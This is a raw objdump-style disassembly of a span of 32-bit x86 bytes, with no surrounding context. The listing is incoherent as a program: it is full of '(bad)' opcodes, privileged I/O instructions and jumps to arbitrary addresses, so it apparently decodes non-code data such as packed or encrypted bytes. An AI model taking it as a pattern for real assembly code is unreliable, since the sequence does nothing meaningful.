  41696f:	lea    ebx,[ebx+esi*4]
  416972:	fimul  WORD PTR [edi+0x140be835]
  416978:	out    0xbb,al
  41697a:	pusha  
  41697b:	aad    0x37
  41697d:	sbb    BYTE PTR [eax],0x43
  416980:	int    0x33
  416982:	mov    edi,0x99bec584
  416987:	pop    esi
  416988:	aaa    
  416989:	inc    ebp
  41698a:	pop    esp
  41698b:	xchg   ah,bl
  41698d:	mov    bl,0xf
  41698f:	sub    eax,0x9b9e7912
  416994:	sti    
  416995:	mov    edx,0xf4b54aa2
  41699a:	mov    edx,0x51a070c9
  41699f:	sbb    dh,dl
  4169a1:	aas    
  4169a2:	mov    WORD PTR [esi],gs
  4169a4:	mov    esi,0x16942290
  4169a9:	xor    BYTE PTR [ecx],bl
  4169ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ac:	mov    ecx,0x8aef43e9
  4169b1:	pop    ds
  4169b2:	jecxz  0x4169b9
  4169b4:	sahf   
  4169b5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4169b7:	pusha  
  4169b8:	aam    0x7e
  4169ba:	(bad)  
  4169bb:	mov    al,0xe
  4169bd:	and    dh,ch
  4169bf:	(bad)  
  4169c0:	in     eax,dx
  4169c1:	jl     0x41696a
  4169c3:	retf   
  4169c4:	dec    edx
  4169c5:	push   eax
  4169c6:	pushf  
  4169c7:	call   0x7d7805fa
  4169cc:	mov    cs,ebp
  4169ce:	jecxz  0x4169a5
  4169d0:	iret   
  4169d1:	jae    0x4169ac
  4169d3:	inc    ebx
  4169d4:	fnstsw WORD PTR gs:[edi-0x1ace0040]
  4169db:	sti    
  4169dc:	dec    esp
  4169dd:	test   eax,0xd1da7a93
  4169e2:	jmp    0xe603ccf0
  4169e7:	xor    ebx,esi
  4169e9:	scas   eax,DWORD PTR es:[edi]
  4169ea:	outs   dx,BYTE PTR ds:[esi]
  4169eb:	imul   ecx,DWORD PTR ds:0xe54c1dae,0xffffffd3
  4169f2:	cld    
  4169f3:	adc    BYTE PTR [edx+eiz*2],ch
  4169f6:	mov    ds:0xca7a1649,al
  4169fb:	ins    BYTE PTR es:[edi],dx
  4169fc:	jae    0x416a30
  4169fe:	ret    0xa0d
  416a01:	bound  edx,QWORD PTR [edi-0x5397e2de]
  416a07:	int3   
  416a08:	push   ebx
  416a09:	das    
  416a0a:	ss xchg ebp,eax
  416a0c:	mov    edx,0xdc42ffa8
  416a11:	lea    ebp,[edi+0x38]
  416a14:	lods   eax,DWORD PTR ds:[esi]
  416a15:	xor    dh,bh
  416a17:	fcmovnbe st,st(4)
  416a19:	cmp    eax,ecx
  416a1b:	mov    dl,0x9
  416a1d:	sub    al,0x75
  416a1f:	sbb    DWORD PTR [eax],ebp
  416a21:	jns    0x416a59
  416a23:	lahf   
  416a24:	dec    edi
  416a25:	mov    WORD PTR fs:[edi],fs
  416a28:	or     DWORD PTR [ecx+0x57],esi
  416a2b:	pop    es
  416a2c:	test   al,0xb7
  416a2e:	daa    
  416a2f:	ret    
  416a30:	push   ss
  416a31:	(bad)  
  416a32:	jbe    0x416a61
  416a34:	arpl   WORD PTR [eax-0x112b9e9],sp
  416a3a:	push   ecx
  416a3b:	rcr    BYTE PTR [ebp-0x12],1
  416a3e:	mov    ch,0xd5
  416a40:	test   ax,0xd518
  416a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a45:	xchg   edx,eax
  416a46:	xchg   ah,bh
  416a48:	hlt    
  416a49:	push   ds
  416a4a:	arpl   WORD PTR [edx],bp
  416a4c:	push   ecx
  416a4d:	jmp    0xf7f4:0xab494653
  416a54:	cli    
  416a55:	out    0xb5,al
  416a57:	cld    
  416a58:	loope  0x416a9c
  416a5a:	loope  0x416a30
  416a5c:	and    BYTE PTR [eiz*1+0x18b6c6d6],dh
  416a63:	mov    ah,0x22
  416a65:	inc    ebp
  416a66:	lock push es
  416a68:	ja     0x416aa6
  416a6a:	mov    ah,0xd8
  416a6c:	dec    eax
  416a6d:	sub    esp,DWORD PTR [esi*2-0x585f8dc4]
  416a74:	cmc    
  416a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a76:	push   es
  416a77:	(bad)  
  416a79:	scas   al,BYTE PTR es:[edi]
  416a7a:	pop    ds
  416a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7c:	in     eax,dx
  416a7d:	mov    al,0x63
  416a7f:	add    BYTE PTR [esi-0x58],bh
  416a82:	jnp    0x416aa3
  416a84:	loope  0x416a4d
  416a86:	ds jb  0x416a57
  416a89:	jo     0x416aac
  416a8b:	shl    ch,1
  416a8d:	sub    dh,ch
  416a8f:	sub    ch,cl
  416a91:	pop    es
  416a92:	lea    edx,[esi+0x588838a8]
  416a98:	mov    BYTE PTR [edx+0x1b],bh
  416a9b:	bound  ebx,QWORD PTR [edi+0x10]
  416a9e:	and    eax,0x102c6022
  416aa3:	call   0x9a2a15cc
  416aa8:	call   0x93c93c4c
  416aad:	adc    al,0x5e
  416aaf:	mov    edx,0xae3f83ae
  416ab4:	sbb    eax,ecx
  416ab6:	pushf  
  416ab7:	ret    
  416ab8:	jb     0x416b09
  416aba:	mov    eax,0x4042853e
  416abf:	fimul  WORD PTR [ecx-0x1036651c]
  416ac5:	hlt    
  416ac6:	xchg   edx,eax
  416ac7:	add    eax,0x76412ebc
  416acc:	add    BYTE PTR [edx-0x101e91e2],bh
  416ad2:	shl    BYTE PTR [esp+edi*8+0x3c52873b],cl
  416ad9:	rol    DWORD PTR [edx+0x1f547611],1
  416adf:	add    eax,0x13449b9
  416ae4:	cmp    DWORD PTR [edx+edx*8+0x4d],0x90973e88
  416aec:	cmp    dl,cl
  416aee:	(bad)  
  416aef:	data16 add dh,BYTE PTR [edi-0x655eb636]
  416af6:	sbb    eax,0xe279188d
  416afb:	xor    BYTE PTR [ecx],ch
  416afd:	ins    DWORD PTR es:[edi],dx
  416afe:	test   DWORD PTR [esp+ecx*8],ebx
  416b01:	pop    edx
  416b02:	sub    BYTE PTR [edi],ch
  416b04:	mov    es,WORD PTR [edx-0xd]
  416b07:	cmp    ebx,DWORD PTR [ebx-0x54e5ced9]
  416b0d:	mov    ebx,0x5e0e12a1
  416b12:	out    0x48,al
  416b14:	xchg   BYTE PTR [esi+0x1f],ah
  416b17:	or     cl,dl
  416b19:	(bad)  
  416b1a:	jge    0x416b4a
  416b1c:	into   
  416b1d:	icebp  
  416b1e:	mov    esp,0x885f6e74
  416b23:	loop   0x416b9c
  416b25:	leave  
  416b26:	mov    dl,0x1
  416b28:	mov    al,ds:0x4d27fd61
  416b2d:	stos   DWORD PTR es:[edi],eax
  416b2e:	cmp    BYTE PTR [ecx+0x49b2c38],ah
  416b34:	xor    eax,DWORD PTR [ebx]
  416b36:	aad    0xc3
  416b38:	aam    0xb0
  416b3a:	push   eax
  416b3b:	pop    ebx
  416b3c:	repz scas al,BYTE PTR es:[edi]
  416b3e:	push   edi
  416b3f:	aas    
  416b40:	scas   eax,DWORD PTR es:[edi]
  416b41:	mov    esi,DWORD PTR [eax+0x3e928f21]
  416b47:	sub    bl,BYTE PTR [ebx-0x4b9f4202]
  416b4d:	mov    al,ds:0xec9ec1be
  416b52:	jge    0x416b7c
  416b54:	and    edi,ebp
  416b56:	xchg   edx,eax
  416b57:	xor    eax,0x145fb2a8
  416b5c:	shl    DWORD PTR [esi+esi*2],0x8b
  416b60:	push   eax
  416b61:	jnp    0x416b6e
  416b63:	pop    esp
  416b64:	hlt    
  416b65:	je     0x416af4
  416b67:	and    eax,0xc4b437b6
  416b6c:	cs pop ecx
  416b6e:	out    0xd1,eax
  416b70:	sub    BYTE PTR [ebp-0x713f84bf],0xf7
  416b77:	dec    edx
  416b78:	adc    esi,DWORD PTR [eax-0x26]
  416b7b:	ja     0x416bfa
  416b7d:	add    BYTE PTR [edi+0x7],ch
  416b80:	pop    ds
  416b81:	dec    esi
  416b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b83:	stos   DWORD PTR es:[edi],eax
  416b84:	scas   al,BYTE PTR es:[edi]
  416b85:	daa    
  416b86:	add    ecx,esp
  416b88:	and    esi,eax
  416b8a:	dec    edx
  416b8b:	repnz sub bl,ah
  416b8e:	adc    DWORD PTR [ebp+edi*4+0x79],0x4877e88c
  416b96:	daa    
  416b97:	lock mov ch,0x64
  416b9a:	cld    
  416b9b:	call   0x5f06:0xdf717154
  416ba2:	or     BYTE PTR [ecx+edx*2-0x231f77a1],al
  416ba9:	icebp  
  416baa:	pop    ecx
  416bab:	or     ch,BYTE PTR [ecx+0x7a]
  416bae:	es push esp
  416bb0:	mov    al,0x8b
  416bb2:	scas   al,BYTE PTR es:[edi]
  416bb3:	clc    
  416bb4:	test   DWORD PTR [ebx+0x659f3490],ecx
  416bba:	or     bl,BYTE PTR [eax]
  416bbc:	lods   al,BYTE PTR ds:[esi]
  416bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bbe:	add    ch,BYTE PTR [eax+0x7a93ca7d]
  416bc4:	cwde   
  416bc5:	xlat   BYTE PTR ds:[ebx]
  416bc6:	pop    ds
  416bc7:	rcl    BYTE PTR [edx-0x4e405b6],0x6c
  416bce:	xor    DWORD PTR [esi],edx
  416bd0:	sbb    bh,BYTE PTR [edi+0x4e07d576]
  416bd6:	push   ecx
  416bd7:	sub    esp,DWORD PTR [edx+0x5f]
  416bda:	mov    bl,0x37
  416bdc:	adc    al,0x5a
  416bde:	(bad)  
  416bdf:	int3   
  416be0:	jecxz  0x416c5e
  416be2:	out    dx,al
  416be3:	jae    0x416b75
  416be5:	inc    ecx
  416be6:	in     al,0x55
  416be8:	outs   dx,BYTE PTR ds:[esi]
  416be9:	icebp  
  416bea:	dec    edi
  416beb:	psadbw mm1,QWORD PTR [eax]
  416bee:	enter  0x3552,0x9d
  416bf2:	retf   0xa3a2
  416bf5:	shr    DWORD PTR [esi-0x4fa1d3bf],0xdb
  416bfc:	shl    DWORD PTR [edi],cl
  416bfe:	push   ebp
  416bff:	mov    BYTE PTR [edx],dh
  416c01:	out    dx,al
  416c02:	dec    ebp
  416c03:	push   edx
  416c04:	mov    cl,ch
  416c06:	and    eax,0x10c00dfe
  416c0b:	mov    ds:0x344e94be,al
  416c10:	fsubr  st(4),st
  416c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c13:	aas    
  416c14:	push   edx
  416c15:	aad    0xe0
  416c17:	add    edx,DWORD PTR [edx+eax*2]
  416c1a:	ja     0x416bc7
  416c1c:	jnp    0x416bbc
  416c1e:	gs loop 0x416c48
  416c21:	add    al,0xfd
  416c23:	loopne 0x416c62
  416c25:	jmp    0x416bc7
  416c27:	imul   edx,DWORD PTR [ebx+edi*1-0x1ecd107],0xd05f058b
  416c32:	out    dx,eax
  416c33:	enter  0x8a63,0x96
  416c37:	shr    BYTE PTR [esi],0x15
  416c3a:	adc    edx,DWORD PTR [ebx-0x6b]
  416c3d:	sahf   
  416c3e:	pop    ecx
  416c3f:	(bad)  
  416c40:	out    0x6d,al
  416c42:	pop    esp
  416c43:	repnz pusha 
  416c45:	rcl    DWORD PTR [edx-0x45b7f0a9],1
  416c4b:	mov    cs,ebp
  416c4d:	mov    ss,esi
  416c4f:	or     al,0x9d
  416c51:	jo     0x416c13
  416c53:	push   0x557a05ba
  416c58:	or     ebx,eax
  416c5a:	loop   0x416bf1
  416c5c:	pop    esi
  416c5d:	xchg   esi,eax
  416c5e:	dec    ecx
  416c5f:	xchg   edi,eax
  416c60:	ja     0x416c67
  416c62:	xchg   ebx,eax
  416c63:	mov    WORD PTR [edx-0x75ca38be],cs
  416c69:	repz jne 0x416c13
  416c6c:	xor    DWORD PTR [ecx+0x24c92fe8],ebx
  416c72:	push   edx
  416c73:	ds hlt 
  416c75:	(bad)  [esi+ecx*8-0x6cc22068]
  416c7c:	inc    ebx
  416c7d:	rcl    BYTE PTR [eax],cl
  416c7f:	add    dl,al
  416c81:	daa    
  416c82:	imul   esp,DWORD PTR [esi-0x1e172a4d],0x1fe7b1b3
  416c8c:	adc    cl,BYTE PTR [ecx]
  416c8e:	sub    BYTE PTR [esi+ecx*4-0x6c0966d0],dl
  416c95:	add    ah,BYTE PTR [ecx]
  416c97:	sbb    ch,dh
  416c99:	pop    es
  416c9a:	push   edi
  416c9b:	sbb    ebp,DWORD PTR [esi+0x74741b99]
  416ca1:	int3   
  416ca2:	cdq    
  416ca3:	pop    ds
  416ca4:	(bad)  
  416ca5:	cmp    eax,0xe6068401
  416caa:	lods   eax,DWORD PTR fs:[esi]
  416cac:	inc    ah
  416cae:	pop    ds
  416caf:	and    esp,DWORD PTR [esi+eax*8]
  416cb2:	or     al,0x35
  416cb4:	fidiv  WORD PTR [esi]
  416cb6:	xchg   edi,eax
  416cb7:	scas   al,BYTE PTR es:[edi]
  416cb8:	sub    ecx,DWORD PTR [ecx+0x4f9f9d50]
  416cbe:	je     0x416cee
  416cc0:	jg     0x416c86
  416cc2:	sub    eax,DWORD PTR [ebx]
  416cc4:	leave  
  416cc5:	je     0x416d1d
  416cc7:	lods   eax,DWORD PTR ds:[esi]
  416cc8:	call   FWORD PTR [ebx-0x5f504ec4]
  416cce:	out    dx,eax
  416ccf:	or     al,0x20
  416cd1:	jo     0x416c6d
  416cd3:	pop    esp
  416cd4:	(bad)  
  416cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cd6:	mov    WORD PTR [esi-0x5052b349],ds
  416cdc:	dec    ebx
  416cdd:	out    0xf9,al
  416cdf:	dec    esi
  416ce0:	leave  
  416ce1:	inc    ecx
  416ce2:	and    DWORD PTR [esi],0xffffff89
  416ce5:	je     0x416cde
  416ce7:	jnp    0x416cb6
  416ce9:	mov    edi,0xfa8bcf10
  416cee:	in     al,0x7f
  416cf0:	lods   al,BYTE PTR ds:[esi]
  416cf1:	xchg   esp,eax
  416cf2:	mov    ds:0xf8aa2e84,al
  416cf7:	and    BYTE PTR [edi+0x63],0xe8
  416cfb:	in     eax,dx
  416cfc:	push   ds
  416cfd:	adc    DWORD PTR [esi-0x79],ecx
  416d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d01:	sar    BYTE PTR [ecx-0xe0d0e1e],cl
  416d07:	and    BYTE PTR [ebp+0x74],bl
  416d0a:	ins    BYTE PTR es:[edi],dx
  416d0b:	sub    DWORD PTR [edx-0x66],edx
  416d0e:	jo     0x416d7d
  416d10:	imul   BYTE PTR [edx-0x4d]
  416d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d14:	add    esi,DWORD PTR [ecx-0x4a82c6ce]
  416d1a:	jb     0x416d63
  416d1c:	xor    al,0x5f
  416d1e:	iret   
  416d1f:	add    BYTE PTR [ebx],ah
  416d21:	(bad)  
  416d22:	fsubrp st(5),st
  416d24:	xchg   DWORD PTR [ebx+0x59ab381d],edi
  416d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d2b:	fwait
  416d2c:	cs adc eax,0x5a21b0c6
  416d32:	fcomi  st,st(5)
  416d34:	mov    ch,0x6b
  416d36:	in     eax,0xc0
  416d38:	dec    edi
  416d39:	stos   BYTE PTR es:[edi],al
  416d3a:	mov    dl,0x8c
  416d3c:	or     edi,esi
  416d3e:	fprem1 
  416d40:	outs   dx,BYTE PTR ds:[esi]
  416d41:	ins    DWORD PTR es:[edi],dx
  416d42:	xlat   BYTE PTR ds:[ebx]
  416d43:	pop    esp
  416d44:	(bad)  
  416d45:	dec    edi
  416d46:	ja     0x416d89
  416d48:	stc    
  416d49:	sbb    eax,0x69f3b703
  416d4e:	lods   eax,DWORD PTR ds:[esi]
  416d4f:	jge    0x416da5
  416d51:	clts   
  416d53:	xchg   ebp,eax
  416d54:	mov    ds:0x9fad0873,al
  416d59:	and    cl,BYTE PTR [ebx+0x2a]
  416d5c:	dec    edi
  416d5d:	pop    ebp
  416d5e:	retf   
  416d5f:	shl    BYTE PTR [esi+0x4e],cl
  416d62:	pop    edi
  416d63:	add    BYTE PTR [esi-0x17195953],0x7d
  416d6a:	lods   al,BYTE PTR ds:[esi]
  416d6b:	mov    ecx,0xcdf8d300
  416d70:	push   es
  416d71:	fdiv   st,st(6)
  416d73:	enter  0xd613,0x9c
  416d77:	(bad)  
  416d78:	or     DWORD PTR [eax+eiz*1-0x7461e493],ecx
  416d7f:	sbb    al,ch
  416d81:	pop    esp
  416d82:	or     al,BYTE PTR [eax-0x1]
  416d85:	push   ebx
  416d86:	fdivr  QWORD PTR [esi]
  416d88:	bswap  ebp
  416d8a:	dec    esp
  416d8b:	loope  0x416d6a
  416d8d:	call   0xd882:0xfa2da058
  416d94:	jmp    0xd396:0xb20dfcf3
  416d9b:	sub    DWORD PTR [eax-0x1f3d81c9],esi
  416da1:	lahf   
  416da2:	push   0xfffffff9
  416da4:	ss push ebp
  416da6:	cmp    BYTE PTR ds:0xc711bd72,cl
  416dac:	imul   ecx,DWORD PTR [ebx],0x6bed8562
  416db2:	inc    ebx
  416db3:	stos   DWORD PTR es:[edi],eax
  416db4:	xor    esi,DWORD PTR [ebx-0x72]
  416db7:	push   0xe3d531a3
  416dbc:	mov    edx,0x92cb36aa
  416dc1:	retf   
  416dc2:	mov    ecx,0x2f164def
  416dc7:	xor    BYTE PTR [esi*8+0x398b0b7e],bh
  416dce:	jae    0x416da9
  416dd0:	mov    cl,BYTE PTR [ecx+0x3b38389]
  416dd6:	cwde   
  416dd7:	imul   ebp,DWORD PTR [edx+0xcaa969f],0x70
  416dde:	int    0x7b
  416de0:	loope  0x416da8
  416de2:	into   
  416de3:	gs jo  0x416e42
  416de6:	pop    ds
  416de7:	cdq    
  416de8:	mov    cl,BYTE PTR [ecx+ebp*2+0x47f049a0]
  416def:	mov    cl,0xcd
  416df1:	add    edi,DWORD PTR [ebx-0x55]
  416df4:	and    edi,DWORD PTR [bx+di]
  416df7:	mov    bl,0x71
  416df9:	fs push ds
  416dfb:	mov    ebx,0xc1eb192c
  416e00:	lahf   
  416e01:	rol    DWORD PTR ds:0xccae039e,1
  416e07:	ja     0x416da7
  416e09:	pop    ecx
  416e0a:	cli    
  416e0b:	mov    ebx,0x4db2a094
  416e10:	mov    al,ds:0xe570dca3
  416e15:	add    eax,0xff0e2633
  416e1a:	push   eax
  416e1b:	cdq    
  416e1c:	bound  eax,QWORD PTR [esp+eax*8]
  416e1f:	jg     0x416e89
  416e21:	neg    BYTE PTR [ebp-0x27]
  416e24:	shr    dl,0x2a
  416e27:	sar    BYTE PTR [edx],1
  416e29:	pop    ecx
  416e2a:	(bad)  
  416e2b:	inc    edx
  416e2c:	inc    edx
  416e2d:	outs   dx,DWORD PTR ds:[esi]
  416e2e:	popa   
  416e2f:	lods   al,BYTE PTR ds:[esi]
  416e30:	adc    DWORD PTR [edx],ebx
  416e32:	into   
  416e33:	aam    0x35
  416e35:	mov    bh,0xdc
  416e37:	in     al,0x2f
  416e39:	adc    BYTE PTR [edx],al
  416e3b:	inc    eax
  416e3c:	mov    BYTE PTR [ebx-0x24fe5212],ch
  416e42:	sbb    esi,DWORD PTR [edx]
  416e44:	mov    ebp,0xbf055116
  416e49:	pop    ss
  416e4a:	xor    DWORD PTR [edx-0x80],0x91fe00a
  416e51:	in     al,dx
  416e52:	push   eax
  416e53:	es fcom st(1)
  416e56:	out    dx,al
  416e57:	mov    eax,DWORD PTR [ebx+esi*4-0x59cb1040]
  416e5e:	mov    ch,0x53
  416e60:	cdq    
  416e61:	sub    cl,bl
  416e63:	pushf  
  416e64:	dec    ebp
  416e65:	sbb    BYTE PTR [edi],dl
  416e67:	mov    ch,0x50
  416e69:	add    eax,0x99a4aa86
  416e6e:	stc    
  416e6f:	push   ebp
  416e70:	stc    
  416e71:	jae    0x416ec7
  416e73:	jo     0x416ec1
  416e75:	inc    edx
  416e76:	fdivr  DWORD PTR [ebx-0x7]
  416e79:	mov    ds:0xbcd0be92,al
  416e7e:	xchg   ebx,eax
  416e7f:	not    BYTE PTR [ebx+eiz*8-0x5d]
  416e83:	and    DWORD PTR [edx],esp
  416e85:	aas    
  416e86:	pop    esi
  416e87:	mov    BYTE PTR [ecx],bl
  416e89:	(bad)  
  416e8a:	dec    edx
  416e8b:	inc    eax
  416e8c:	leave  
  416e8d:	scas   al,BYTE PTR es:[edi]
  416e8e:	rcr    BYTE PTR [esi-0x3c],cl
  416e91:	addr16 add dl,dl
  416e94:	stos   DWORD PTR es:[edi],eax
  416e95:	(bad)
  416e9a:	mov    bh,0xe5
  416e9c:	push   ss
  416e9d:	test   DWORD PTR [esi],edx
  416e9f:	dec    eax
  416ea0:	rol    BYTE PTR [ebp-0x42],0xaf
  416ea4:	lea    edx,[edx+eax*2]
  416ea7:	cs jecxz 0x416eba
  416eaa:	pop    ebx
  416eab:	or     BYTE PTR [ebx-0x6e9fdad1],cl
  416eb1:	cmc    
  416eb2:	or     eax,0xc267965c
  416eb7:	pop    edx
  416eb8:	xchg   esp,eax
  416eb9:	xchg   edx,eax
  416eba:	mov    DWORD PTR ds:0x4d4bb842,esi
  416ec0:	or     BYTE PTR [eax],dh
  416ec2:	push   edi
  416ec3:	test   DWORD PTR [edi-0x68],ebx
  416ec6:	dec    edx
  416ec7:	and    BYTE PTR ds:0xcfd9ac9c,bl
  416ecd:	cwde   
  416ece:	push   eax
  416ecf:	or     ebx,DWORD PTR [esi+0x28]
  416ed2:	mov    WORD PTR [ebx+0x7d],cs
  416ed5:	call   0xc3916f4c
  416eda:	hlt    
  416edb:	push   0xffffffb0
  416edd:	(bad)  
  416ede:	aam    0x81
  416ee0:	jecxz  0x416e7e
  416ee2:	mov    edi,0x65649208
  416ee7:	in     al,dx
  416ee8:	mov    dl,0x1c
  416eea:	push   0x1a9fb790
  416eef:	stc    
  416ef0:	jle    0x416f4c
  416ef2:	or     al,0x90
  416ef4:	mov    ah,0x4f
  416ef6:	pop    esp
  416ef7:	stc    
  416ef8:	fwait
  416ef9:	pop    eax
  416efa:	pop    ebp
  416efb:	jp     0x416f17
  416efd:	inc    esp
  416eff:	cwde   
  416f00:	add    eax,0x33a63e03
  416f05:	jp     0x416f5c
  416f07:	jmp    0x43c343ce
  416f0c:	jecxz  0x416ee0
  416f0e:	nop
  416f0f:	jnp    0x416f2e
  416f11:	(bad)  
  416f12:	scas   eax,DWORD PTR es:[edi]
  416f13:	adc    DWORD PTR ds:0x58d3a5cf,edx
  416f19:	ds cld 
  416f1b:	jb     0x416f7b
  416f1d:	adc    ebx,edi
  416f1f:	retf   0x73b8
  416f22:	aas    
  416f23:	retf   0xe6b7
  416f26:	jae    0x416ece
  416f28:	jb     0x416f91
  416f2a:	mov    bh,0x6a
  416f2c:	js     0x416f57
  416f2e:	or     edx,DWORD PTR [esi+0x58]
  416f31:	adc    BYTE PTR [eax-0x4b],dl
  416f34:	pop    edx
  416f35:	mov    WORD PTR [edx],ss
  416f37:	push   ebp
  416f38:	loope  0x416ef8
  416f3a:	pusha  
  416f3b:	std    
  416f3c:	scas   eax,DWORD PTR es:[edi]
  416f3d:	push   ecx
  416f3e:	repnz adc cl,BYTE PTR [edi]
  416f41:	fisub  WORD PTR [ebx-0x9]
  416f44:	pop    ecx
  416f45:	dec    ebp
  416f46:	sbb    edi,DWORD PTR [ebp-0x42]
  416f49:	shr    al,0x93
  416f4c:	xchg   esi,eax
  416f4d:	ins    BYTE PTR es:[edi],dx
  416f4e:	sar    DWORD PTR [edi+0x7cc0ef4e],0x30
  416f55:	dec    esi
  416f56:	retf   0x5539
  416f59:	jnp    0x416fb9
  416f5b:	js     0x416fdb
  416f5d:	and    ebp,eax
  416f5f:	push   ds
  416f60:	cmp    BYTE PTR [eax+0x14bf406a],ah
  416f66:	mov    ecx,0x9689f6bd
  416f6b:	adc    DWORD PTR [esi-0x5a],0x4d
  416f6f:	push   edi
  416f70:	loopne 0x416f63
  416f72:	fist   DWORD PTR [eax-0x14]
  416f75:	into   
  416f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f77:	popa   
  416f78:	ss push esp
  416f7a:	mov    bl,0xb1
  416f7c:	dec    esi
  416f7d:	add    eax,0x1783a2ad
  416f82:	out    0x99,eax
  416f84:	fs addr16 loope 0x416f60
  416f88:	stc    
  416f89:	(bad)  
  416f8a:	in     al,dx
  416f8b:	(bad)  
  416f8c:	pop    eax
  416f8d:	test   eax,0xf64e4dc0
  416f92:	pop    eax
  416f94:	std    
  416f95:	pop    ebx
  416f96:	adc    BYTE PTR [edx+0x1b],dh
  416f99:	xchg   DWORD PTR [edi+0x12a017da],esi
  416f9f:	imul   esi,DWORD PTR [ecx],0x5f
  416fa2:	lahf   
  416fa3:	mov    bl,0x0
  416fa5:	mov    eax,ds:0x4baec428
  416faa:	sub    edx,ebx
  416fac:	or     eax,0x5e9af8b0
  416fb1:	(bad)  
  416fb3:	mov    ah,0x40
  416fb5:	xchg   ecx,eax
  416fb6:	addr16 ja 0x416fa8
  416fb9:	push   0x9b7210c8
  416fbe:	xchg   esi,eax
  416fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc0:	dec    edi
  416fc1:	sahf   
  416fc2:	pop    esi
  416fc3:	outs   dx,BYTE PTR ds:[esi]
  416fc4:	adc    ch,BYTE PTR [ebx+0x1f]
  416fc7:	popf   
  416fc8:	popf   
  416fc9:	mov    ds:0x384f9ef6,eax
  416fce:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fd0:	aas    
  416fd1:	xor    esp,0xb00a63d7
  416fd7:	sbb    bl,ah
  416fd9:	cmp    al,0x2d
  416fdb:	and    eax,0x7a4e56f9
  416fe0:	retf   
  416fe1:	jmp    0x416f78
  416fe3:	push   esp
  416fe4:	sar    al,1
  416fe6:	inc    eax
  416fe7:	sub    al,0x37
  416fe9:	sub    al,BYTE PTR [edx]
  416feb:	xlat   BYTE PTR ds:[ebx]
  416fec:	or     al,BYTE PTR [ecx]
  416fee:	fsub   DWORD PTR [edi-0x36002bd2]
  416ff4:	ins    BYTE PTR es:[edi],dx
  416ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ff6:	push   ss
  416ff7:	in     al,0xf8
  416ff9:	imul   edx,edi,0xffffffb5
  416ffc:	sbb    BYTE PTR [edx],dh
  416ffe:	test   DWORD PTR [esi-0x575fb5ee],esp
  417004:	xchg   esi,eax
  417005:	jo     0x416fa4
  417007:	in     eax,dx
  417008:	mov    bl,0x31
  41700a:	push   es
  41700b:	adc    cl,BYTE PTR [ebp+0x31eb90e8]
  417011:	inc    esp
  417012:	scas   al,BYTE PTR es:[edi]
  417013:	call   0x8e8bd137
  417018:	sbb    esi,DWORD PTR [ebp+0x512e0a54]
  41701e:	ret    
  41701f:	push   ebp
  417020:	sub    cl,cl
  417022:	in     al,0xb6
  417024:	into   
  417025:	jno    0x417082
  417027:	push   0x19cf0619
  41702c:	test   BYTE PTR [esi-0x11],dl
  41702f:	fmul   st(1),st
  417031:	sub    esp,DWORD PTR [esp+eiz*4-0x6]
  417035:	dec    ecx
  417036:	jbe    0x4170b5
  417038:	mov    esi,0x7c5c8729
  41703d:	dec    eax
  41703e:	in     eax,0xeb
  417040:	pop    ss
  417041:	cmp    eax,0x5e311f66
  417046:	xchg   DWORD PTR [ebx+0x72e8be53],ebx
  41704c:	fld    st(0)
  41704e:	fnsave [ebp-0x66]
  417051:	pusha  
  417052:	leave  
  417053:	jge    0x417073
  417055:	(bad)  
  417056:	and    DWORD PTR [ecx+0x9],esi
  417059:	cmp    esi,DWORD PTR [edi-0x77]
  41705c:	retf   
  41705d:	push   edx
  41705e:	mov    bh,0x8c
  417060:	add    al,0x89
  417062:	xchg   ebp,eax
  417063:	pop    esp
  417064:	jecxz  0x4170cf
  417066:	addr16 mov esp,0xfd195bd1
  41706c:	push   esi
  41706d:	mov    eax,ds:0xe0034089
  417072:	mov    dh,0x6a
  417074:	mov    dh,0x3f
  417076:	jns    0x4170a1
  417078:	push   esp
  417079:	test   eax,0x5fec5770
  41707e:	cdq    
  41707f:	es js  0x417003
  417082:	sub    BYTE PTR [edx+0x546e978],ah
  417088:	ja     0x417089
  41708a:	int3   
  41708b:	popa   
  41708c:	jbe    0x41709a
  41708e:	in     eax,0xe0
  417090:	xor    eax,0xe590e0d0
  417095:	sbb    al,0xbd
  417097:	cmp    al,0x92
  417099:	gs je  0x417069
  41709c:	cmp    BYTE PTR [ebx+0x65],al
  41709f:	(bad)  
  4170a0:	fst    DWORD PTR [ebx+0xd396414]
  4170a6:	cmp    BYTE PTR [esi-0x53a3e3a8],dh
  4170ac:	xchg   esp,eax
  4170ad:	(bad)  
  4170ae:	push   edi
  4170af:	jmp    0x46286b31
  4170b4:	sbb    ebp,ecx
  4170b6:	lea    edx,[eax-0x2b]
  4170b9:	xchg   edx,eax
  4170ba:	pop    ebx
  4170bb:	retf   0x655d
  4170be:	mov    bl,ch
  4170c0:	stc    
  4170c1:	retf   0x23b2
  4170c4:	addr16 mov bh,0x60
  4170c7:	adc    BYTE PTR [edx],0x7
  4170ca:	or     al,0x8a
  4170cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170cd:	mov    es,WORD PTR [edx+eax*8]
  4170d0:	push   edi
  4170d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170d2:	pop    esp
  4170d3:	add    DWORD PTR [edi-0x6d],edx
  4170d6:	lods   al,BYTE PTR ds:[esi]
  4170d7:	adc    eax,0x69de7e3b
  4170dc:	dec    eax
  4170dd:	mov    al,ch
  4170df:	cmp    dl,BYTE PTR [ecx+0x55]
  4170e2:	outs   dx,BYTE PTR ds:[esi]
  4170e3:	mov    al,0xaa
  4170e5:	pop    esp
